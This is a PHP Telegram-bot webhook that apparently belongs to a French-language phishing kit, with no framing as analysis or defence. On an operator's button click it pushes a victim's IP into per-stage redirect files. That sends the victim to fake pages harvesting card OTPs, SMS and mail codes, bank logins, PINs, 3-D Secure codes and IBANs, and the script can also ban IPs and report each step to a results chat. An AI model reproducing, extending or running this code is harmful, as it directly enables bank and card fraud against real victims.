<?php
require_once __DIR__ . '/functions.php';
require_once __DIR__ . '/../config.php';

$update = json_decode((string)file_get_contents('php://input'), true);
if (!is_array($update) || empty($update['callback_query'])) {
    http_response_code(200);
    exit;
}

$cb        = $update['callback_query'];
$cbId      = (string)($cb['id'] ?? '');
$messageId = $cb['message']['message_id'] ?? null;
$data      = (string)($cb['data'] ?? '');
$username  = $cb['from']['username'] ?? 'inconnu';

$parts  = explode('=', $data, 2);
$action = $parts[0] ?? '';
$ip     = $parts[1] ?? '';

function readId(string $f): string {
    $v = @file_get_contents($f);
    return $v === false ? '' : trim($v);
}

$dossier = readId(__DIR__ . '/../id1.txt');
$loading = readId(__DIR__ . '/../id5.txt');

$redir = ($dossier !== '' && $loading !== '')
    ? __DIR__ . "/../{$dossier}/{$loading}/redirect/"
    : '';

if ($redir === '' || !is_dir($redir)) {
    $redir = '';
    foreach (glob(__DIR__ . '/../*/*/redirect', GLOB_ONLYDIR) ?: [] as $c) {
        $redir = $c . '/';
        break;
    }
}

function push(string $file, string $ip): void {
    if ($ip === '' || !is_dir(dirname($file))) return;
    $cur = is_readable($file)
        ? file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)
        : [];
    if (in_array($ip, $cur, true)) return;
    @file_put_contents($file, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function answer(string $cbId, string $text = ''): void {
    global $telegram;
    if ($cbId === '') return;
    $url = "https://api.telegram.org/bot" . urlencode($telegram['token'])
         . "/answerCallbackQuery?callback_query_id=" . urlencode($cbId)
         . "&text=" . urlencode($text);
    $ctx = stream_context_create(['http' => ['timeout' => 2, 'ignore_errors' => true]]);
    @file_get_contents($url, false, $ctx);
}

$actions = [
    'otp'           => ['otp.txt',           'OTP'],
    'otperror'      => ['otperror.txt',      'OTP INVALIDE'],
    'carteInvalide' => ['carteInvalide.txt', 'CARTE INVALIDE'],
    'sms'           => ['sms.txt',           'OTP SMS'],
    'smserror'      => ['smserror.txt',      'OTP SMS INVALIDE'],
    'bank'          => ['bank.txt',          'LOG BANK'],
    'bankerror'     => ['bankerror.txt',     'LOG BANK INVALIDE'],
    'mail'          => ['mail.txt',          'OTP MAIL'],
    'mailerror'     => ['mailerror.txt',     'OTP MAIL INVALIDE'],
    'pin'           => ['pin.txt',           'PIN'],
    'pinerror'      => ['pinerror.txt',      'PIN INVALIDE'],
    'vbv'           => ['vbv.txt',           'VBV'],
    'vbvgood'       => ['vbvgood.txt',       'VBV VALIDE'],
    'iban'          => ['iban.txt',          'IBAN'],
    'ibanerror'     => ['ibanerror.txt',     'IBAN INVALIDE'],
    'fin'           => ['fin.txt',           'FIN'],
];

if ($action === 'ban') {
    push(__DIR__ . '/../bl.txt', $ip);
    sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> BAN", null, $messageId);
    answer($cbId, 'BAN');
}
elseif ($action === 'docs') {
    sendMessage($telegram['RezChatId']['card'], "Cette option n'est pas encore disponible ! RDV dans la prochaine mise à jour :)", null, $messageId);
    answer($cbId, 'Bientôt');
}
elseif (isset($actions[$action]) && $redir !== '') {
    [$target, $label] = $actions[$action];
    push($redir . $target, $ip);
    sendMessage($telegram['RezChatId']['card'], "@{$username} à cliqué sur IP : {$ip} -> {$label}", null, $messageId);
    answer($cbId, $label);
}
else {
    answer($cbId, 'Action inconnue');
}

http_response_code(200);